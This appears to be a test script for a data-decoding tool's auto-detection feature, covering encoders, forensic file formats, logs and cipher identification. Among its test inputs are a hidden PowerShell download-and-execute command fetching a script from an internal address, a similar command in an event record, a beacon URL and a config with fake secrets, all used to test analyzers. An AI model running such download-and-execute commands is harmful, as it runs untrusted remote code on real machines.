#!/usr/bin/env node
// SPDX-License-Identifier: MIT
// Tests the Magic hints that operations declare for themselves (modules/*/_magic.js, core/magic-detect.js):
//   * decoders: data encoded with HexSpindle's own operations must be recognised and decoded as the top suggestion
//   * suggested analysis: artifacts and text formats must be offered the operations that parse them
//   * identification: ciphertext and hashes that cannot be decoded must be described, and ordinary text left alone
// Runs in Node, like ci-magic.mjs.
import '../modules/index.js';
import { readFileSync } from 'node:fs';
import { gzipSync } from 'node:zlib';
import { fileURLToPath } from 'node:url';
import { MODULES, MAGIC_HINTS } from '../core/registry.js';
import { callModule, resolveArgs } from '../core/engine.js';
import * as magic from '../core/magic.js';

const verbose = process.argv.includes('-v');
const enc = new TextEncoder(), dec = new TextDecoder();
const run = async (data, name, args = []) => {
  if (!MODULES[name]) throw new Error(`Missing operation: ${name}`);
  return (await callModule(MODULES[name], typeof data === 'string' ? enc.encode(data) : data, resolveArgs(MODULES[name], args, new Map())))[0];
};
const fixture = f => new Uint8Array(readFileSync(fileURLToPath(new URL(`./fixtures/forensics/${f}`, import.meta.url))));
const cat = (...parts) => { const b = parts.map(p => typeof p === 'string' ? Uint8Array.from(p, c => c.charCodeAt(0)) : p); const o = new Uint8Array(b.reduce((n, x) => n + x.length, 0)); let i = 0; for (const x of b) { o.set(x, i); i += x.length; } return o; };
const pad = (head, n) => cat(head, new Uint8Array(Math.max(0, n - head.length)));
const SENTENCE = 'The quick brown fox jumps over the lazy dog and this is a secret message for the test.';
const JSONTXT = '{"user":"admin","token":"abc123","roles":["reader","writer"],"active":true}';
let ok = 0, n = 0; const fails = [];
const stagesOf = r => r.stages.map(s => s.label).join(' > ') || '(input)';

// ---- decoders: [label, input, expected first stage (prefix), expected output text or null] ----------
const D = [];
const d = (label, input, stage, want = null, opt = {}) => D.push({ label, input, stage, want, ...opt });
d('Braille', () => run('hello world', 'To Braille'), 'From Braille', 'hello world', { ci: true });
d('Bech32', () => run(enc.encode('hexspindle bech32 payload'), 'To Bech32'), 'From Bech32');
d('Charcode decimal (non-Latin)', () => run('سلام دنیا، این پیام', 'To Charcode', ['Space', 10]), 'From Charcode', 'سلام دنیا، این پیام');
d('Hex content', () => run(SENTENCE, 'To Hex Content', ['All chars', false]), 'From Hex Content', SENTENCE);
d('Modhex', () => run(SENTENCE, 'To Modhex'), 'From Modhex', SENTENCE);
d('Punycode', () => run('münchen.example', 'To Punycode', [true]), 'From Punycode', 'münchen.example');
d('MessagePack', () => run(JSONTXT, 'To MessagePack'), 'From MessagePack');
d('CBOR', () => run(JSONTXT, 'CBOR Encode'), 'CBOR Decode');
d('Rison', () => run(JSONTXT, 'Rison Encode'), 'Rison Decode');
d('LZW codes', () => run((SENTENCE + ' ').repeat(4), 'LZW Encode'), 'LZW Decode', (SENTENCE + ' ').repeat(4));
d('Microsoft Script Encoder', () => enc.encode('#@~^DgAAAA==\\ko$K6,JCV^GJqAQAAA==^#~@'), 'Microsoft Script Decoder');
d('NetBIOS name', () => run('WORKSTATION', 'Encode NetBIOS Name'), 'Decode NetBIOS Name');
d('Chunked HTTP body', () => enc.encode('7\r\nMozilla\r\n9\r\nDeveloper\r\n7\r\nNetwork\r\n0\r\n\r\n'), 'Dechunk HTTP response');
d('HTTP response with gzip body', () => cat('HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Encoding: gzip\r\n\r\n', new Uint8Array(gzipSync(Buffer.from(SENTENCE)))), 'Strip HTTP headers', SENTENCE);
d('ANSI colour codes', () => enc.encode('\x1b[31mError:\x1b[0m the build step failed, see \x1b[1mthe log\x1b[0m for details'), 'Remove ANSI Escape Codes', 'Error: the build step failed, see the log for details');
d('Case-insensitive regex', () => run('hello world', 'To Case Insensitive Regex'), 'From Case Insensitive Regex', 'hello world', { ci: true });
d('Flask session cookie', () => enc.encode('eyJ1c2VyIjoiYWRtaW4iLCJsb2dnZWRfaW4iOnRydWV9.ZxYzAb.Q2hlY2tzdW1TaWduYXR1cmVWYWx1ZTEyMw'), 'Flask Session Decode');
d('Cetacean', () => run('hello there', 'Cetacean Cipher Encode'), 'Cetacean Cipher Decode', 'hello there');
d('Citrix CTX1', () => run('Winter2026!pass', 'Citrix CTX1 Encode'), 'Citrix CTX1 Decode', 'Winter2026!pass');
d('Bacon A/B', () => run('hello world this is a test', 'Bacon Cipher Encode', ['Standard (I=J and U=V)', 'A/B', false, false]), 'Bacon Cipher Decode');
d('A1Z26', () => run('hello world this is a test', 'A1Z26 Cipher Encode'), 'A1Z26 Cipher Decode');
d('Affine (a=5, b=8)', () => run(SENTENCE, 'Affine Cipher Encode', [5, 8]), 'Affine Cipher Decode', SENTENCE);
d('Affine (a=11, b=3)', () => run(SENTENCE, 'Affine Cipher Encode', [11, 3]), 'Affine Cipher Decode', SENTENCE);
d('Rail fence (3 rails)', () => run(SENTENCE, 'Rail Fence Cipher Encode', [3, 0]), 'Rail Fence Cipher Decode', SENTENCE);
d('Rail fence (5 rails)', () => run(SENTENCE, 'Rail Fence Cipher Encode', [5, 0]), 'Rail Fence Cipher Decode', SENTENCE);
d('EVTX file', () => fixture('evtx-binxml-two-events.evtx'), 'EVTX to JSON');
d('Base64 of Braille', async () => run(await run('hello world', 'To Braille'), 'To Base64'), 'From Base64 > From Braille', null, { chain: true });
for (const c of D) {
  n++;
  try {
    const input = await c.input();
    const res = await magic.search(input, 3);
    const top = res[0], chain = stagesOf(top), got = dec.decode(top.data);
    const stageOk = c.chain ? chain.startsWith(c.stage) : chain.split(' > ')[0].startsWith(c.stage) || chain.startsWith(c.stage);
    const dataOk = c.want === null || got === c.want || (c.ci && got.toLowerCase().trim() === c.want.toLowerCase());
    if (stageOk && dataOk && top.score >= 50) { ok++; if (verbose) console.log(`ok   ${c.label}: ${chain} [${top.score}] ${JSON.stringify(got.slice(0, 50))}`); }
    else fails.push(`DECODE ${c.label}: top ${chain} [${top.score}] ${JSON.stringify(got.slice(0, 60))} | input ${JSON.stringify(dec.decode(input.subarray(0, 50)))}`);
  } catch (e) { fails.push(`DECODE ${c.label}: ERROR ${e.message}`); }
}

// ---- suggested analysis: [label, input, operations that must be suggested, { on: 'top' to check the top result }] ----
const A = [];
const a = (label, input, expect, opt = {}) => A.push({ label, input, expect, ...opt });
const exe = fixture('setuptools-cli-64.exe');
a('PE executable', exe, ['Parse PE Header', 'PE Section Analyzer']);
a('Base64 of a PE executable', async () => run(exe.subarray(0, 6000), 'To Base64'), ['Parse PE Header'], { on: 'top' });
a('Registry hive', fixture('registry-value-synthetic.hiv'), ['Windows Registry Hive Inspector']);
a('Prefetch (uncompressed)', fixture('prefetch-uncompressed-controlled.pf'), ['Windows Prefetch Parser']);
a('Prefetch (MAM04)', fixture('prefetch-mam04-controlled.pf'), ['Windows Prefetch Parser']);
a('EVTX', fixture('evtx-binxml-two-events.evtx'), ['Windows EVTX Metadata Inspector', 'EVTX to XML']);
a('ELF', pad('\x7fELF\x02\x01\x01', 128), ['Parse ELF Header']);
a('Mach-O', pad('\xcf\xfa\xed\xfe\x07\x00\x00\x01', 128), ['Mach-O Header Parser']);
a('DEX', pad('dex\n035\0', 128), ['DEX Metadata Parser']);
a('PCAP', pad('\xd4\xc3\xb2\xa1\x02\x00\x04\x00', 64), ['Parse PCAP Summary']);
a('Binary plist', pad('bplist00\xd1\x01\x02', 64), ['P-list Viewer']);
a('MP3 with ID3', pad('ID3\x03\x00\x00\x00\x00\x00\x21', 128), ['Extract ID3', 'Extract Audio Metadata']);
a('JPEG', pad('\xff\xd8\xff\xe1\x00\x18Exif\0\0', 128), ['Extract EXIF']);
a('LNK', pad('L\0\0\0\x01\x14\x02\0\0\0\0\0\xc0\0\0\0\0\0\0F', 128), ['Windows LNK Parser']);
a('SQLite (Firefox places)', cat(pad('SQLite format 3\0', 100), 'CREATE TABLE moz_places (id INTEGER PRIMARY KEY, url LONGVARCHAR)'), ['Firefox History Parser']);
a('SQLite (Chromium history)', cat(pad('SQLite format 3\0', 100), 'CREATE TABLE downloads_url_chains (id INTEGER NOT NULL)'), ['Chrome History Parser', 'Chromium Downloads Parser']);
a('APK', cat('PK\x03\x04\x14\0\0\0\x08\0', pad('', 20), 'AndroidManifest.xml', pad('', 64)), ['Android APK Manifest Analyzer']);
a('PEM certificate', '-----BEGIN CERTIFICATE-----\nMIIBhTCCASugAwIBAgIQIRi6zePL6mKjOipn+dNuaTAKBggqhkjOPQQDAjASMRAw\n-----END CERTIFICATE-----\n', ['Parse X.509 certificate']);
a('PEM CSR', '-----BEGIN CERTIFICATE REQUEST-----\nMIICvDCCAaQCAQAwdzELMAkGA1UEBhMCVVMxDTALBgNVBAgMBFV0YWgxDzANBgNV\n-----END CERTIFICATE REQUEST-----\n', ['Parse CSR']);
a('SSH public key', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl user@host', ['Parse SSH Host Key']);
a('PGP message', '-----BEGIN PGP MESSAGE-----\n\nhQEMA1AyQ0tnHGBnAQf/WqfGJmR1nYF0b0p2mXQ5cR2yq0d1Yt0=\n=abcd\n-----END PGP MESSAGE-----\n', ['PGP Decrypt'], { needs: true });
a('Fernet token', 'gAAAAABl2Xo1Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=', ['Fernet Decrypt'], { needs: true });
a('OpenSSL salted (base64)', 'U2FsdGVkX1+2h3Jk0n8mXlq2yVn0Gk1m3o5q7s9u1w3y5A7C9E1G3I5K7M9O1Q3S', ['Derive EVP key'], { needs: true });
a('JWT', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c', ['JWT Verify'], { needs: true });
a('ADFGVX ciphertext', 'AGDXV FAXDV GAFDX VGADF XVGAD FXVGA DFXVG ADFXV GADFX VGADF', ['ADFGVX Cipher Decode'], { needs: true });
a('Apache access log', '203.0.113.7 - - [13/Oct/2026:10:11:44 +0000] "GET /index.html HTTP/1.1" 200 1043 "-" "curl/8.0"\n203.0.113.8 - bob [13/Oct/2026:10:11:45 +0000] "POST /login HTTP/1.1" 302 0\n', ['Apache/Nginx Access Log Analyzer']);
a('IIS log', '#Software: Microsoft Internet Information Services 10.0\n#Fields: date time cs-method cs-uri-stem sc-status\n2026-10-13 10:11:44 GET /index.html 200\n', ['IIS Log Parser']);
a('auditd', 'type=SYSCALL msg=audit(1697190704.123:4567): arch=c000003e syscall=59 success=yes exit=0\ntype=EXECVE msg=audit(1697190704.123:4567): argc=2 a0="ls"\n', ['Linux Auditd Parser']);
a('auth log', 'Oct 13 10:11:44 host sshd[1234]: Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2\nOct 13 10:11:50 host sshd[1234]: Accepted publickey for bob from 203.0.113.10 port 4243 ssh2\n', ['Linux Auth Log Analyzer']);
a('CloudTrail', '{"Records":[{"eventVersion":"1.08","eventSource":"iam.amazonaws.com","eventName":"CreateUser","awsRegion":"us-east-1"}]}', ['AWS CloudTrail Analyzer']);
a('Zone.Identifier', '[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://example.com/\r\nHostUrl=https://example.com/setup.exe\r\n', ['Zone.Identifier ADS Parser']);
a('Scheduled task XML', '<?xml version="1.0" encoding="UTF-16"?>\n<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Actions><Exec><Command>calc.exe</Command></Exec></Actions></Task>', ['Scheduled Task XML Parser']);
a('Windows logon event XML', '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4624</EventID></System><EventData><Data Name="TargetUserName">bob</Data></EventData></Event>', ['Windows Logon Analyzer', 'Windows Event ID Explainer']);
a('PowerShell 4104 event JSON', '[{"EventID":4104,"ProviderName":"Microsoft-Windows-PowerShell","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString(\'http://x/a\')"}]', ['PowerShell Script Block Analyzer']);
a('Extension manifest', '{\n  "manifest_version": 3,\n  "name": "Example",\n  "permissions": ["tabs", "cookies"]\n}', ['Chromium Extension Manifest Analyzer']);
a('Email headers', 'Received: from mail.example.org (mail.example.org [203.0.113.5]) by mx.example.com; Tue, 13 Oct 2026 10:11:44 +0000\nFrom: Alice <alice@example.org>\nSubject: Invoice\nMessage-ID: <1@example.org>\n', ['Parse Email Headers']);
a('User agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36', ['Parse User Agent']);
a('URL with query', 'https://user@example.com:8443/path/to/page?id=42&mode=edit#top', ['Parse URI']);
a('IPv6 address', '2001:0db8:85a3:0000:0000:8a2e:0370:7334', ['Parse IPv6 address']);
a('CIDR range', '10.20.0.0/22', ['Parse IP range']);
a('Cron expression', '*/15 2 * * 1-5', ['Cron Expression Explainer']);
a('Colour code', '#38f2ff', ['Parse colour code']);
a('UUID', '550e8400-e29b-41d4-a716-446655440000', ['UUID / ULID / Snowflake Inspector']);
a('UNIX timestamp', '1791886304', ['From UNIX Timestamp', 'Parse Any Timestamp']);
a('MongoDB ObjectID', '507f1f77bcf86cd799439011', ['Parse ObjectID timestamp']);
a('MD5 hash', '5d41402abc4b2a76b9719d911017c592', ['Analyse hash']);
a('Text with indicators', 'Beacon to http://203.0.113.9/gate.php from 10.1.2.3, dropped file hash 5d41402abc4b2a76b9719d911017c592, contact ops@example.org', ['Extract IOCs']);
a('Text hiding a Base64 blob', 'config = load("VGhpcyBpcyBhIGhpZGRlbiBwYXlsb2FkIGluc2lkZSBhIGNvbmZpZyBmaWxlIQ==") # do not edit', ['Extract Base64 strings']);
a('Suspicious script', 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://10.0.0.5/a.ps1\')"', ['Suspicious Script Analyzer']);
a('Config with secrets', 'db_host = 10.0.0.5\napi_key = "sk_live_51Habc123def456ghi789"\npassword: hunter2\n', ['Secret Scanner']);
a('IPv4 header (hex)', '4500002800004000400600007f0000017f000001' + '00'.repeat(20), ['Parse IPv4 header']);
a('TLS record', cat('\x16\x03\x01\x00\x10', pad('\x01\x00\x00\x0c\x03\x03', 16)), ['Parse TLS record']);
a('DER sequence', cat('\x30\x82\x00\x10', pad('\x02\x01\x01\x04\x0b', 16)), ['Parse ASN.1 hex string']);
for (const c of A) {
  n++;
  try {
    let input = typeof c.input === 'function' ? await c.input() : c.input;
    if (typeof input === 'string') input = enc.encode(input);
    const res = await magic.search(input, 3);
    const target = c.on === 'top' ? res[0] : res.find(r => !r.path.length);
    const names = target.analyses.map(x => x.name);
    const missing = c.expect.filter(e => !names.includes(e));
    const keyed = !c.needs || target.analyses.filter(x => c.expect.includes(x.name)).every(x => x.requires);
    if (!missing.length && keyed) { ok++; if (verbose) console.log(`ok   ${c.label}: ${target.analyses.map(x => x.label).join(' | ')}`); }
    else fails.push(`ANALYSE ${c.label}: missing ${JSON.stringify(missing)} | suggested: ${target.analyses.map(x => x.label).join(' | ') || '(none)'} | top ${stagesOf(res[0])} [${res[0].score}]`);
  } catch (e) { fails.push(`ANALYSE ${c.label}: ERROR ${e.message}`); }
}

// ---- nothing should be suggested for ordinary content ----------------------------------------------------
for (const t of [SENTENCE, 'password', 'hello world', JSONTXT, 'Meet me at the usual place at noon tomorrow', 'id,name,score\n1,alice,90\n2,bob,85', 'SELECT id FROM accounts WHERE active = 1;', 'Order #48213 shipped via DHL']) {
  n++;
  const res = await magic.search(enc.encode(t), 3);
  const rootNode = res.find(r => !r.path.length);
  if (!rootNode.analyses.length && !rootNode.notes.length) { ok++; if (verbose) console.log('ok   quiet:', JSON.stringify(t.slice(0, 30))); }
  else fails.push(`QUIET ${JSON.stringify(t.slice(0, 40))}: suggested ${rootNode.analyses.map(x => x.label).join(' | ')} notes ${JSON.stringify(rootNode.notes)}`);
}

// ---- identification notes ----------------------------------------------------------------------------
const vig = await run(SENTENCE.repeat(3), 'Vigenère Encode', ['LEMONADE']);
const sub = await run(SENTENCE.repeat(3).replace(/[^a-zA-Z]/g, ''), 'Affine Cipher Encode', [7, 3]);   // letters only, looks like a substitution
const rnd = Uint8Array.from({ length: 256 }, (_, i) => (i * 197 + 91 * ((i * i) % 251) + (i >> 2) * 13) & 255);
for (const [label, input, rx] of [['Vigenère ciphertext', enc.encode(dec.decode(vig).replace(/[^a-zA-Z]/g, '')), /polyalphabetic/], ['Random 256 bytes', rnd, /High-entropy/], ['MD5', enc.encode('5d41402abc4b2a76b9719d911017c592'), /MD5/], ['UUID', enc.encode('550e8400-e29b-41d4-a716-446655440000'), /UUID/]]) {
  n++;
  const res = await magic.search(input, 3);
  const notes = res.find(r => !r.path.length).notes;
  if (notes.some(x => rx.test(x))) { ok++; if (verbose) console.log(`ok   note ${label}: ${notes[0].slice(0, 90)}`); }
  else fails.push(`NOTE ${label}: ${JSON.stringify(notes)} | top ${stagesOf(res[0])} [${res[0].score}]`);
}
// ---- every hint must belong to a real operation ------------------------------------------------------------
n++;
const orphaned = Object.keys(MAGIC_HINTS).filter(name => !MODULES[name]);
if (!orphaned.length && Object.keys(MAGIC_HINTS).length >= 130) ok++;
else fails.push(`REGISTRY ${Object.keys(MAGIC_HINTS).length} hinted operations; hints for operations that do not exist: ${JSON.stringify(orphaned)}`);

for (const f of fails) console.error('FAIL', f.slice(0, 400));
console.log(`Magic hints: ${ok}/${n} checks passed (${Object.keys(MAGIC_HINTS).length} operations declare hints)`);
if (fails.length) process.exitCode = 1;
